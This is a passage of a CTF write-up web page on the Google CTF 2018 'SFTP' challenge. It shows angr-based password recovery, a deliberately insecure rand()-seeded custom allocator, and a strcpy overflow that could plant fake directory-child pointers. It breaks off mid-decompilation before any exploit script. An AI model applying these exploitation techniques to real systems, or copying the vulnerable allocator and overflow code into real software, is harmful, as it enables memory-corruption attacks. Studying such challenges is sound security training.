<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>SFTP - Google CTF 2018 &#183; mhackeroni</title><meta name=title content="SFTP - Google CTF 2018 &#183; mhackeroni"><meta name=description content="Write-up for the SFTP challenge from Google CTF 2018."><meta name=keywords content="google,ctf,pwn,mhackeroni,"><link rel=canonical href=https://mhackeroni.it/writeups/2018-06-29-google-ctf-2018-sftp/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1d8c7618f0ef6623fd6ebffc2988f58f128a919c43d2ed5d99a0621768c50d3ec37bd1e02b3eb119ba92bc64d53422281addaaa107a57202376dbd6a14e2e50e.css integrity="sha512-HYx2GPDvZiP9br/8KYj1jxKKkZxD0u1dmaBiF2jFDT7De9HgKz6xGbqSvGTVNCIoGt2qoQelcgI3bb1qFOLlDg=="><script type=text/javascript src=/js/appearance.min.2a7f28406ff67c2e3fedcfa49ff1dc78cca5f4b2ace4618a279f94d3fd241566af610abcf38bb98ec3f039afc0acbb3c27e9eced17e4a072f1a98e18a628ec7e.js integrity="sha512-Kn8oQG/2fC4/7c+kn/HceMyl9LKs5GGKJ5+U0/0kFWavYQq884u5jsPwOa/ArLs8J+ns7RfkoHLxqY4Ypijsfg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://mhackeroni.it/writeups/2018-06-29-google-ctf-2018-sftp/"><meta property="og:site_name" content="mhackeroni"><meta property="og:title" content="SFTP - Google CTF 2018"><meta property="og:description" content="Write-up for the SFTP challenge from Google CTF 2018."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-06-29T00:00:00+00:00"><meta property="article:modified_time" content="2018-06-29T00:00:00+00:00"><meta property="article:tag" content="Google"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Pwn"><meta property="article:tag" content="Mhackeroni"><meta name=twitter:card content="summary"><meta name=twitter:title content="SFTP - Google CTF 2018"><meta name=twitter:description content="Write-up for the SFTP challenge from Google CTF 2018."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"SFTP - Google CTF 2018","headline":"SFTP - Google CTF 2018","description":"Write-up for the SFTP challenge from Google CTF 2018.","inLanguage":"en","url":"https:\/\/mhackeroni.it\/writeups\/2018-06-29-google-ctf-2018-sftp\/","author":{"@type":"Person","name":"mhackeroni"},"copyrightYear":"2018","dateCreated":"2018-06-29T00:00:00\u002b00:00","datePublished":"2018-06-29T00:00:00\u002b00:00","dateModified":"2018-06-29T00:00:00\u002b00:00","keywords":["google","ctf","pwn","mhackeroni"],"mainEntityOfPage":"true","wordCount":"1662"}]</script><meta name=author content="mhackeroni"><link href=https://bsky.app/profile/mhackeroni.bsky.social rel=me><link href=https://www.facebook.com/mhackeroni rel=me><link href=https://github.com/mhackeroni/ rel=me><link href=https://www.linkedin.com/company/mhackeroni-inc/ rel=me><link href=https://x.com/mhackeroni rel=me><link href=https://www.youtube.com/@mhackeroni rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>mhackeroni</span>
<img src=/mhackeroni-stylized-square.webp width=1024 height=1024 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=mhackeroni></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mhackeroni</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>News</p></a><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Writeups</p></a><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Sponsors>Sponsors</p></a><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="📷  Photo Gallery">Gallery</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>News</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Writeups</p></a></li><li class=mt-1><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Sponsors>Sponsors</p></a></li><li class=mt-1><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="📷  Photo Gallery">Gallery</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">SFTP - Google CTF 2018</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2018-06-29T00:00:00+00:00>29 June 2018</time><span class="px-2 text-primary-500">&#183;</span><span>1662 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">8 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><div class="lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl">Authors: abiondo, andreafioraldi</div><blockquote><p>This file server has a sophisticated malloc implementation designed to thwart traditional heap exploitation techniques&mldr;</p></blockquote><p>The challenge file is only a x86_64 ELF binary named sftp.</p><p>The active protections are the following:</p><ul><li>Partial RELRO</li><li>Stack canary</li><li>NX</li><li>PIE</li><li>FORTIFY</li></ul><p>Executing the file results in a password prompt:</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=sftp_1 srcset="/img/sftp_writeup/sftp_1_hu_6ebac3b3e21fc10f.png 330w,
/img/sftp_writeup/sftp_1_hu_990f5ede32855753.png 660w,
/img/sftp_writeup/sftp_1_hu_708075ea2b27c500.png 1280w" data-zoom-src=/img/sftp_writeup/sftp_1.png src=/img/sftp_writeup/sftp_1.png></figure></p><p>Let’s dissect it in IDA.</p><p>In the main procedure we can see that the authentication is handled by a function that returns a boolean value.</p><p>Here the decompiled code:</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=sftp_2 srcset="/img/sftp_writeup/sftp_2_hu_d656c3bc94caaebc.png 330w,
/img/sftp_writeup/sftp_2_hu_600916e222ef6c.png 660w,
/img/sftp_writeup/sftp_2_hu_fc47fd8d8e543e1b.png 1280w" data-zoom-src=/img/sftp_writeup/sftp_2.png src=/img/sftp_writeup/sftp_2.png></figure></p><p>The password is hashed using a custom algorithm as we can see and the hash must be 0x8dfa to gain the access.</p><p>To reverse the hash I use the IDA Pro plugin IDAngr with the following steps:</p><ul><li>Set a breakpoint just after the password scanf (as in the picture)</li><li>Run the debugger and insert “a”*15 as the password when the debugged process ask for it.</li><li>When the breakpoint is hitted set the avoid address to the “return 0” address and the find address to the “return result” address.</li><li>Mark the password as symbolic</li></ul><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=sftp_3 srcset="/img/sftp_writeup/sftp_3_hu_b17fd41067f89765.png 330w,
/img/sftp_writeup/sftp_3_hu_75254026002cda30.png 660w,
/img/sftp_writeup/sftp_3_hu_e588ed08f59a6e39.png 1280w" data-zoom-src=/img/sftp_writeup/sftp_3.png src=/img/sftp_writeup/sftp_3.png></figure></p><p>To get an usable result some constraints must be added to the symbolic password:
it must be printable and without spaces (due to scanf).</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=sftp_4 srcset="/img/sftp_writeup/sftp_4_hu_8e044f761a37df85.png 330w,
/img/sftp_writeup/sftp_4_hu_92d06d4eb18943bb.png 660w,
/img/sftp_writeup/sftp_4_hu_92f4c63851524ad.png 1280w" data-zoom-src=/img/sftp_writeup/sftp_4.png src=/img/sftp_writeup/sftp_4.png></figure></p><p>Ok it’s time to run the exploration engine and get a result.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=sftp_5 srcset="/img/sftp_writeup/sftp_5_hu_93c0a8bdb616c898.png 330w,
/img/sftp_writeup/sftp_5_hu_9f44b04ce3861859.png 660w,
/img/sftp_writeup/sftp_5_hu_3989dcc872d333c6.png 1280w" data-zoom-src=/img/sftp_writeup/sftp_5.png src=/img/sftp_writeup/sftp_5.png></figure></p><p>… after some time …</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=sftp_6 srcset="/img/sftp_writeup/sftp_6_hu_54d01c64e55de947.png 330w,
/img/sftp_writeup/sftp_6_hu_d1d4af7700611cc4.png 660w,
/img/sftp_writeup/sftp_6_hu_a73c42e9d2bef100.png 1280w" data-zoom-src=/img/sftp_writeup/sftp_6.png src=/img/sftp_writeup/sftp_6.png></figure></p><p>Here you go! <strong>p&amp;a2]</strong> is a valid password for SFTP.</p><p>After the successful login we are in a shell-like prompt with some commands available:</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=sftp_7 srcset="/img/sftp_writeup/sftp_7_hu_f87431b0d873400b.png 330w,
/img/sftp_writeup/sftp_7_hu_9425384d0d0574e7.png 660w,
/img/sftp_writeup/sftp_7_hu_6d0ceee16f8847a5.png 1280w" data-zoom-src=/img/sftp_writeup/sftp_7.png src=/img/sftp_writeup/sftp_7.png></figure></p><p>With ls we can see that in the current directory there are two nodes: flag and src.</p><p>The command “get flag” returned a very interesting output, check it <a href=https://i.ytimg.com/vi/PtUmOMlWYcw/maxresdefault.jpg target=_blank>here</a>.</p><p>In the src folder you can find the application source code sftp.c (You can find it in the attached zip file).</p><p>The next step is to analyze the code in order to find a vulnerability.</p><p>You can immediately see that the files secure_allocator.h and filesystem.h included in the code are missing and so we must combine the sftp.c file with the information that we can extract from the binary with a bit of reverse engineering.</p><p>Firstly we try to reconstruct secure_allocator.h in which is probably defined a custom implementation of malloc, realloc and free.</p><p>In the binary we have 3 wonderful symbols, malloc realloc and free.</p><p>They actually look pretty dumb:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>malloc</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nf>rand</span><span class=p>()</span> <span class=o>&amp;</span> <span class=mh>0x1FFFFFFF</span> <span class=o>|</span> <span class=mh>0x40000000LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>free</span><span class=p>(</span><span class=kt>void</span><span class=o>*</span> <span class=n>ptr</span><span class=p>)</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>realloc</span><span class=p>(</span><span class=kt>void</span><span class=o>*</span> <span class=n>ptr</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In order to work malloc needs the address 0x40000000 to be mapped and in the main procedure this is not done, so let’s search for an initialization routine.</p><p>The binary has the .init_array section, a list of functions pointers that are executed before main.</p><p>These pointers are two in sftp.</p><p>The first is the allocator initializer, it maps 0x40000000 and calls srand with time(0).</p><p>This is good because the rand return value (and so malloc) is predictable.</p><p>The second is related to the filesystem initialization, we will analyze it later.</p><p>With a first analysis of the source code you can notice that the structure entry has a name field of size name_max (20) but the new_entry procedure takes a path as parameter of size path_max (4096) and then it is copied with strcpy in child->name.</p><p>So we have an overflow here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>entry</span><span class=o>**</span> <span class=nf>new_entry</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>path</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>name</span> <span class=o>=</span> <span class=nf>strrchr</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=sc>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>name</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>name</span><span class=o>++</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>child</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>entry</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=o>*</span><span class=n>child</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>parent_directory</span> <span class=o>=</span> <span class=n>parent</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=o>*</span><span class=n>child</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>type</span> <span class=o>=</span> <span class=n>INVALID_ENTRY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>strcpy</span><span class=p>((</span><span class=o>*</span><span class=n>child</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>name</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span> <span class=c1>//OVERFLOW
</span></span></span></code></pre></div><p>The secure allocator realloc implementation combined with the new_entry code is very interesting.</p><p>In particular this line of code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>directory_entry</span><span class=o>*</span> <span class=n>new_parent</span> <span class=o>=</span> <span class=nf>realloc</span><span class=p>(</span><span class=n>parent</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>directory_entry</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>parent</span><span class=o>-&gt;</span><span class=n>child_count</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>entry</span><span class=o>*</span><span class=p>)));</span>
</span></span></code></pre></div><p>By default a directory entry has an array of 16 elements used to store pointers to children entries.</p><p>The realloc does nothing so if we can write a fake address in the <code>entry->child[17]</code> when child_count is less than 16 it will be considered a child of the directory also after the reallocation.</p><p>How could we possibly write somthing in this array? Of course using the buffer overflow in the name field!</p><p>We can craft a fake child abusing the code of new_directory + new_entry:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>directory_entry</span><span class=o>*</span> <span class=nf>new_directory</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>path</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>directory_entry</span><span class=o>*</span> <span class=n>dir</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>entry</span><span class=o>**</span> <span class=n>child</span> <span class=o>=</span> <span class=nf>new_entry</span><span class=p>(</span><span class=n>path</span><span class=p>);</span> <span class=c1>//do here the overflow using path
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>dir</span> <span class=o>=</span> <span class=nf>realloc</span><span class=p>(</span><span class=o>*</span><span class=n>child</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>directory_entry</span><span class=p>)</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>entry</span><span class=o>*</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>dir</span><span class=o>-&gt;</span><span class=n>entry</span><span class=p>.</span><span class=n>type</span> <span class=o>=</span> <span class=n>DIRECTORY_ENTRY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>dir</span><span class=o>-&gt;</span><span class=n>child_count</span> <span class=o>=</span> <span class=mi>16</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>dir</span><span class=o>-&gt;</span><span class=n>child</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>16</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>entry</span><span class=o>*</span><span class=p>));</span> <span class=c1>//beware!
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>dir</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>With the overflow in name we must write data until the 17th child entry of the directory (the first 16 are later set to 0 with the memset).</p><p>Now we have a problem? Which address we must write in the array?</p><p>We should use a fake entry created with put_file, but how we can know the address of a entry?</p><p>Simply, we can predict malloc using rand(time(0)) in the exploit.</p><p>So let’s return to the filesystem initialization routine.
(Import the structures in IDA for a better re)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>directory_entry</span> <span class=o>*</span><span class=nf>init_filesystem</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>file_entry</span> <span class=o>*</span><span class=n>flag_entry</span><span class=p>;</span> <span class=c1>// rbx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>size_t</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>size_t</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// rdx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>v4</span><span class=p>;</span> <span class=c1>// rdi
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>size_t</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>v6</span><span class=p>;</span> <span class=c1>// rdx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=n>file_entry</span> <span class=o>*</span><span class=n>v7</span><span class=p>;</span> <span class=c1>// rbx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>size_t</span> <span class=n>v8</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v9</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>size_t</span> <span class=n>v10</span><span class=p>;</span> <span class=c1>// rdx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>v11</span><span class=p>;</span> <span class=c1>// rdi
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=n>directory_entry</span> <span class=o>*</span><span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_BYTE</span> <span class=o>*</span><span class=n>v13</span><span class=p>;</span> <span class=c1>// rdx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>home_entry</span><span class=p>.</span><span class=n>entry</span><span class=p>.</span><span class=n>parent_directory</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>strcpy</span><span class=p>(</span><span class=n>home_entry</span><span class=p>.</span><span class=n>entry</span><span class=p>.</span><span class=n>name</span><span class=p>,</span> <span class=s>&#34;home&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>root</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>home_entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>home_entry</span><span class=p>.</span><span class=n>child_count</span> <span class=o>=</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>user_entry_ptr</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>pwd</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>home_entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>pwd</span> <span class=o>=</span> <span class=nf>new_dir</span><span class=p>(</span><span class=n>username</span><span class=p>);</span> <span class=c1>//&lt;&lt;&lt;&lt;&lt;&lt;
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>flag_entry</span> <span class=o>=</span> <span class=o>*</span><span class=nf>new_entry</span><span class=p>(</span><span class=s>&#34;flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=n>fake_flag_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>flag_entry</span><span class=o>-&gt;</span><span class=n>entry</span><span class=p>.</span><span class=n>type</span> <span class=o>=</span> <span class=n>FILE_ENTRY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>flag_entry</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>=</span> <span class=n>v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=n>fake_flag_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=p>(</span><span class=n>v2</span> <span class=o>&amp;</span> <span class=mh>0x1FFFFFFF</span> <span class=o>|</span> <span class=mh>0x40000000LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>flag_entry</span><span class=o>-&gt;</span><span class=n>data</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>memcpy</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_flag_content</span><span class=p>,</span> <span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>flag_entry</span><span class=o>-&gt;</span><span class=n>size</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
